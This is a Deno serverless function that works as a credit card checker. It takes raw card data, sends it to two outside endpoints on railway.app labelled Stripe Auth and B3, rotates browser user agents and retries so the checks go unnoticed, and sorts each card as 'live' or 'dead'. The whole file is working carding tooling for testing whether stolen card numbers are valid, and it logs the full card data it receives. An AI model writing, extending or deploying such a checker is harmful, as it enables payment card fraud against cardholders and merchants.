import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Multiple browser user agents for rotation
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
];

// Get random user agent
const getRandomUserAgent = (): string => {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
};

// Determine status from Stripe Auth API response
const getStripeStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const message = (data?.message as string)?.toLowerCase() || '';
  const status = (data?.status as string)?.toUpperCase() || '';
  
  // LIVE responses
  if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
    return "live";
  }
  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') {
    return "live";
  }
  
  // DEAD responses
  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
    return "dead";
  }
  if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
    return "dead";
  }
  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
    return "dead";
  }
  
  // Everything else is UNKNOWN
  return "unknown";
};

// Determine status from B3 API response
const getB3StatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const message = (data?.message as string)?.toLowerCase() || '';
  const status = (data?.status as string)?.toUpperCase() || '';
  const result = (data?.result as string)?.toLowerCase() || '';
  
  // LIVE responses - B3 API patterns
  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE' || status === 'CHARGED') {
    return "live";
  }
  if (result === 'approved' || result === 'success' || result === 'live') {
    return "live";
  }
  if (message.includes("approved") || message.includes("success") || message.includes("authorized")) {
    return "live";
  }
  if (message.includes("card added successfully") || message.includes("payment method added")) {
    return "live";
  }
  
  // DEAD responses
  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED' || status === 'ERROR') {
    return "dead";
  }
  if (result === 'declined' || result === 'dead' || result === 'failed') {
    return "dead";
  }
  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
    return "dead";
  }
  if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
    return "dead";
  }
  if (message.includes("not authorized") || message.includes("processor declined")) {
    return "dead";
  }
  
  // Everything else is UNKNOWN
  return "unknown";
};

// Perform Stripe Auth API check
const performStripeCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 2;
  const apiUrl = `http://web-production-a3b94.up.railway.app/api?cc=${cc}`;
  
  console.log(`[COMBINED-STRIPE] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    const rawText = await response.text();
    console.log(`[COMBINED-STRIPE] Attempt ${attempt} - Raw API response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
    }

    console.log(`[COMBINED-STRIPE] Attempt ${attempt} - Parsed response:`, data);

    const computedStatus = getStripeStatusFromResponse(data);
    data.computedStatus = computedStatus;
    data.apiStatus = data.status || 'UNKNOWN';
    data.apiMessage = data.message || (data.raw as string) || 'No response message';
    data.gateway = 'stripe';

    // Retry if unknown
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[COMBINED-STRIPE] UNKNOWN response on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 800 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performStripeCheck(cc, newUserAgent, attempt + 1);
    }

    return data;
  } catch (error) {
    console.error(`[COMBINED-STRIPE] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 800 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performStripeCheck(cc, newUserAgent, attempt + 1);
    }
    
    return { 
      status: "ERROR", 
      message: error instanceof Error ? error.message : "Unknown fetch error",
      apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
      computedStatus: "unknown",
      gateway: 'stripe'
    };
  }
};

// Perform B3 API check
const performB3Check = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 2;
  const apiUrl = `https://b3.up.railway.app/${cc}`;
  
  console.log(`[COMBINED-B3] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    const rawText = await response.text();
    console.log(`[COMBINED-B3] Attempt ${attempt} - Raw API response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      // If response is not JSON, try to extract status from text
      const lowerText = rawText.toLowerCase();
      if (lowerText.includes('approved') || lowerText.includes('success') || lowerText.includes('live')) {
        data = { raw: rawText, status: "APPROVED", message: rawText };
      } else if (lowerText.includes('declined') || lowerText.includes('dead') || lowerText.includes('failed')) {
        data = { raw: rawText, status: "DECLINED", message: rawText };
      } else {
        data = { raw: rawText, status: "UNKNOWN", message: rawText };
      }
    }

    console.log(`[COMBINED-B3] Attempt ${attempt} - Parsed response:`, data);

    const computedStatus = getB3StatusFromResponse(data);
    data.computedStatus = computedStatus;
    data.apiStatus = data.status || data.result || 'UNKNOWN';
    data.apiMessage = data.message || data.msg || (data.raw as string) || 'No response message';
    data.gateway = 'b3';

    // Retry if unknown
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[COMBINED-B3] UNKNOWN response on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 800 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performB3Check(cc, newUserAgent, attempt + 1);
    }

    return data;
  } catch (error) {
    console.error(`[COMBINED-B3] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 800 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performB3Check(cc, newUserAgent, attempt + 1);
    }
    
    return { 
      status: "ERROR", 
      message: error instanceof Error ? error.message : "Unknown fetch error",
      apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
      computedStatus: "unknown",
      gateway: 'b3'
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ 
          error: 'Card data (cc) is required', 
          computedStatus: 'unknown',
          apiStatus: 'ERROR',
          apiMessage: 'Card data (cc) is required'
        }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[COMBINED-AUTH] Checking card:', cc);
    console.log('[COMBINED-AUTH] Using User-Agent:', userAgent);

    // Run both checks in parallel for speed
    console.log('[COMBINED-AUTH] Starting parallel checks on Stripe Auth + B3...');
    const [stripeResult, b3Result] = await Promise.all([
      performStripeCheck(cc, userAgent),
      performB3Check(cc, getRandomUserAgent())
    ]);

    console.log('[COMBINED-AUTH] Stripe result:', stripeResult.computedStatus);
    console.log('[COMBINED-AUTH] B3 result:', b3Result.computedStatus);

    // Priority logic:
    // 1. If either API returns LIVE, return LIVE (use that response)
    // 2. If both return DEAD, return DEAD
    // 3. If one is DEAD and other is UNKNOWN, return DEAD
    // 4. Otherwise return UNKNOWN with combined info

    let finalResult: Record<string, unknown>;

    if (stripeResult.computedStatus === "live") {
      console.log('[COMBINED-AUTH] Stripe returned LIVE - using Stripe result');
      finalResult = {
        ...stripeResult,
        checkedGateways: ['stripe', 'b3'],
        usedGateway: 'stripe',
        b3Result: b3Result.computedStatus,
      };
    } else if (b3Result.computedStatus === "live") {
      console.log('[COMBINED-AUTH] B3 returned LIVE - using B3 result');
      finalResult = {
        ...b3Result,
        checkedGateways: ['stripe', 'b3'],
        usedGateway: 'b3',
        stripeResult: stripeResult.computedStatus,
      };
    } else if (stripeResult.computedStatus === "dead" || b3Result.computedStatus === "dead") {
      // Use the DEAD result with more info
      const deadResult = stripeResult.computedStatus === "dead" ? stripeResult : b3Result;
      console.log('[COMBINED-AUTH] At least one DEAD result - using:', deadResult.gateway);
      finalResult = {
        ...deadResult,
        checkedGateways: ['stripe', 'b3'],
        usedGateway: deadResult.gateway,
        stripeResult: stripeResult.computedStatus,
        b3Result: b3Result.computedStatus,
      };
    } else {
      // Both unknown - return combined info
      console.log('[COMBINED-AUTH] Both UNKNOWN - returning combined result');
      finalResult = {
        status: "UNKNOWN",
        computedStatus: "unknown",
        apiStatus: "UNKNOWN",
        apiMessage: `Stripe: ${stripeResult.apiMessage} | B3: ${b3Result.apiMessage}`,
        checkedGateways: ['stripe', 'b3'],
        usedGateway: 'combined',
        stripeResult: stripeResult.computedStatus,
        b3Result: b3Result.computedStatus,
      };
    }

    console.log('[COMBINED-AUTH] Final result:', finalResult.computedStatus, 'via', finalResult.usedGateway);

    return new Response(
      JSON.stringify(finalResult),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[COMBINED-AUTH] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ 
        error: errorMessage, 
        status: "ERROR",
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
